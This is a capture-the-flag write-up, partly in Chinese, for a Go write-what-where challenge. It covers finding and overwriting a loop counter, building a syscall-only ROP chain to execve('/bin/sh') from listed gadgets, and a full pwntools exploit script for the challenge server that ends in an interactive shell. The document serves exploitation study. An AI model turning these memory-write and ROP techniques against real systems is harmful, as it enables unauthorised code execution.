# 1.0 Challenge

1. typical Write Where What challenge 
2. what address to write ?
3. write what value?
4. can only write once, how to increase LOOP
5. no libc no system, can only syscall
6. HOW to build syscall ROP?

# 2.0 Analysis

IN GO SO HARD TO DECOMPILE
FLOW 
can read address value 
can write address value 
but the address must valid 
```
Read or Write? (r/w): r
Enter memory address (in hex, e.g., 0x12345678): 0x7fffb14c0000
Value at 0x7fffb14c0000: 0x00

Read or Write? (r/w): w
Enter memory address (in hex, e.g., 0x12345678): 500000
Enter byte to write (in hex, e.g., 0xAB): 0xa
unexpected fault address 0x500000
```

# 3.0 Solution

## 3.1 Dissemble GO LANG LOOP 
怎样找到 loop 点？
我的方法是 binary ninja 先找到 for loop 的 var
换成 disassembly 
![[Pasted image 20250717023531.png]]
然后我发现是 stack 到 var_190 
![[Pasted image 20250717023521.png]]
在这个 0x00484feb break gdb 就可以看到
address 每次都是 0xc000???db8 结尾
因为 是 no pie 所以后面 三位一定是一样
然后 ？？？ 就是 random 的 
后续方法可以 loop 这个 += 0x1000 check 有没有下一位
![[Pasted image 20250717023505.png]]

为什么要找loop 点？
因为这个题目现在只可以 “写一次” which 1 次可以写 2个bytes 
so 为了 增加 loop 可以写 0xff = 255
目标就是 brute 到可以写的 0xc00007cdb8 write 0xff

## 3.2 ONLY SYSCALL
standard format is 
x64 rmb
`_rdi, rsi, rdx, rcx_, r8d, r9d`

SYSCALL FORMAT 
```python
payload = flat(
    'A' * 8,
    POP_RAX,
    0x3b,
    POP_RDI,
    binsh,
    POP_RSI,
    0x0,
    POP_RDX,
    0X0,
    SYSCALL
)
```
but 我们这个case 不可以 因为没有 pop rsi 
 现在有的 (用 ropgadget)
```python
POP_RAX = 0x00000000004224c4 # 0x00000000004224c4 : pop rax ; ret
POP_RDI = 0x000000000046b3e6 # 0x000000000046b3e6 : pop rdi ; setne al ; ret
POP_RDX = 0x00000000004742ca # 0x00000000004742ca : pop rdx ; ret 2
SYSCALL = 0x0000000000463aa9 # 0x000000000040336c : syscall
POP_RSI = 0x000000000047333e # 0x000000000047333e : pop rsi ; retf 1
MOV_RSI_RAX = 0x000000000041338f # 0x000000000041338f : mov rsi, rax ; ret
```

现在的IDEA 是
pop rdi ; setne al ; ret
bin sh
pop rax ; ret
0
mov rsi, rax ; ret
pop rax ; ret
0x3b
pop rdx ; ret 2
0
syscall

大神是 简化了
pop rdi ; setne al ; ret
bin sh
pop rax ; ret
0x3b
pop rdx ; ret 2
0
syscall

```
# ROP chain for execve("/bin/sh", 0, 0)
# === Build the ROP chain in raw bytes === simple mode
rop = b'' 
rop += p64(POP_RDI)
rop += p64(bin_sh_addr)
rop += p64(POP_RAX)
rop += p64(59)  # execve syscall
rop += p64(POP_RDX)
rop += p64(0)
rop += p64(SYSCALL)
```

## 3.3 WRITE Process?
0x52c000 is writable address
`      0x52c000              0x536000 rw-p     a000      12c000 ./chall`
WRITE /BIN/SH IN 0x52c000 + 0x10

FIND A STACK  0xc00007cdb8 + 0x190
`      0xc000000000       0xc000400000 rw-p   400000      0 [anon_c000000]`
WRITE PAYLOAD in 0xc00007cdb8 + 0x190

```python
rop = paylaod
stack = int(adress, 16) + 0x190  # where to start writing

for i, byte in enumerate(rop):
    addr = stack + i
    p.sendlineafter(b'Read or Write? (r/w):', b'w')
    p.sendlineafter(b'Enter memory address (in hex, e.g., 0x12345678):', f"0x{addr:x}".encode())
    p.sendlineafter(b'Enter byte to write (in hex, e.g., 0xAB):', f"0x{byte:02x}".encode())
    warn(f"Writing byte 0x{byte:02x} to 0x{addr:x}")
    p.recvuntil(b'Wrote')
```
SMRG LIKE BELOW
![[Pasted image 20250717033649.png]]

## 3.4 Trigger CHAIN
make the loop to 0x1
```
# Overwrite the loop counter again to exit the loop and trigger the ROP chain
p.sendlineafter(b'Read or Write? (r/w):', b'w')
p.sendlineafter(b'Enter memory address (in hex, e.g., 0x12345678):', adress)
p.sendlineafter(b'Enter byte to write (in hex, e.g., 0xAB):', b'0x1')
```

waiting SROP to be continue 
# 4.0 FLAG 

# 5.0 FINAL SCRIPT 
not from me, i just study from the goat
```python
from pwn import *

context.log_level = 'warning'
context.update(arch='x86_64', os='linux')
context.terminal = ['wt.exe', 'wsl.exe']

# Remote host configuration
HOST = "nc 34.45.81.67 16003"
ADDRESS, PORT = HOST.split()[1:]  # Extract IP and port from the string

BINARY_NAME = "./chall"
binary = context.binary = ELF(BINARY_NAME, checksec=False)

# Choose remote or local process
if args.REMOTE:
    p = remote(ADDRESS, PORT)
else:
    p = process(binary.path)

# --- Step 1: Find the stack address where the loop counter is stored ---
base_start = 0xc000000000
base_end = 0xc0001ff000
suffix = 0xdb8  # Offset where the counter is likely stored

found = False

for base in range(base_start, base_end + 1, 0x1000):
    addr = base + suffix
    adress = f"0x{addr:x}".encode()
    if args.REMOTE:
        p = remote(ADDRESS, PORT)
    else:
        p = process(binary.path)

    # Try to write 0xff to the suspected counter address
    p.sendlineafter(b'Read or Write? (r/w):', b'w')
    p.sendlineafter(b'Enter memory address (in hex, e.g., 0x12345678):', adress)
    p.sendlineafter(b'Enter byte to write (in hex, e.g., 0xAB):', b'0xff')

    try:
        p.recvline()
        ANS = p.recv()
        warn(ANS)
    except Exception as e:
        ANS = b"Not address"
        warn(f"Exception: {e}")

    # If the prompt appears again, we know the address is correct
    if b'Read or Write?' in ANS:
        print(f"Success for address: {adress.decode()}")
        found = True
        warn(f"found address: {adress}")
        break
    else:
        print(f"Fail for address: {adress.decode()}")
        p.close()

# --- Step 2: Overwrite the loop counter to allow more writes ---
p.sendline(b'w')
p.sendlineafter(b'Enter memory address (in hex, e.g., 0x12345678):', adress)
p.sendlineafter(b'Enter byte to write (in hex, e.g., 0xAB):', b'0xff')

# --- Step 3: Write '/bin/sh' string into memory ---
bin_sh = b"/bin/sh\x00"
base_addr = 0x52c010  # Chosen writable address in memory

for i, bval in enumerate(bin_sh):
    addr = f"0x{base_addr + i:x}".encode()
    p.sendlineafter(b'Read or Write? (r/w):', b'w')
    p.sendlineafter(b'Enter memory address (in hex, e.g., 0x12345678):', addr)
    p.sendlineafter(b'Enter byte to write (in hex, e.g., 0xAB):', f"0x{int(bval):02x}".encode())
    p.recvuntil(b'Wrote')

# --- Step 4: Build and write the ROP chain to the stack ---
# Addresses of ROP gadgets (must be found for your binary)
POP_RAX = 0x00000000004224c4 # 0x00000000004224c4 : pop rax ; ret
POP_RDI = 0x000000000046b3e6 # 0x000000000046b3e6 : pop rdi ; setne al ; ret
POP_RDX = 0x00000000004742ca # 0x00000000004742ca : pop rdx ; ret 2
SYSCALL = 0x0000000000463aa9 # 0x000000000040336c : syscall
POP_RSI = 0x000000000047333e # 0x000000000047333e : pop rsi ; retf 1
MOV_RSI_RAX = 0x000000000041338f # 0x000000000041338f : mov rsi, rax ; ret

# Calculate the stack address where the ROP chain should be written
stack = int(adress, 16) + 0x190
bin_sh_addr = base_addr  # Address where '/bin/sh' was written

# ROP chain for execve("/bin/sh", 0, 0)
# === Build the ROP chain in raw bytes === simple mode
rop = b'' 
rop += p64(POP_RDI)
rop += p64(bin_sh_addr)
rop += p64(POP_RAX)
rop += p64(59)  # execve syscall
rop += p64(POP_RDX)
rop += p64(0)
rop += p64(SYSCALL)

# payload 2 with rsi
# rop = b''
# rop += p64(POP_RDI)
# rop += p64(bin_sh_addr)
# rop += p64(POP_RAX)
# rop += p64(0)
# rop += p64(MOV_RSI_PAX)
# rop += p64(POP_RAX)
# rop += p64(59)  # execve syscall
# rop += p64(POP_RDX)
# rop += p64(0)
# rop += p64(SYSCALL)

# payload 3
# frame = SigreturnFrame()
# frame.rax = constants.SYS_execve
# frame.rdi = bin_sh
# frame.rsi = 0
# frame.rdx = 0
# frame.rip = SYSCALL

# rop = p64(POP_RAX)
# rop += p64(15)
# rop += p64(SYSCALL)

# rop2 = bytes(frame)

# === Write the payload byte-by-byte to stack ===
stack = int(adress, 16) + 0x190  # where to start writing

for i, byte in enumerate(rop):
    addr = stack + i
    p.sendlineafter(b'Read or Write? (r/w):', b'w')
    p.sendlineafter(b'Enter memory address (in hex, e.g., 0x12345678):', f"0x{addr:x}".encode())
    p.sendlineafter(b'Enter byte to write (in hex, e.g., 0xAB):', f"0x{byte:02x}".encode())
    warn(f"Writing byte 0x{byte:02x} to 0x{addr:x}")
    p.recvuntil(b'Wrote')

# --- Step 5: Trigger the ROP chain ---
# Overwrite the loop counter again to exit the loop and trigger the ROP chain
p.sendlineafter(b'Read or Write? (r/w):', b'w')
p.sendlineafter(b'Enter memory address (in hex, e.g., 0x12345678):', adress)
p.sendlineafter(b'Enter byte to write (in hex, e.g., 0xAB):', b'0x1')

# Get interactive shell
p.interactive()
```

# 6.0 REFERENCE
They are goat
ROP
https://m4nj4r0.github.io/blog/posts/l3akctf-2025--pwn/#cosmofile

https://mindcrafters.xyz/writeups/leak-pwn/

SROP ????
https://numb3rs.re/writeup/l3ak2025_gowritewhere/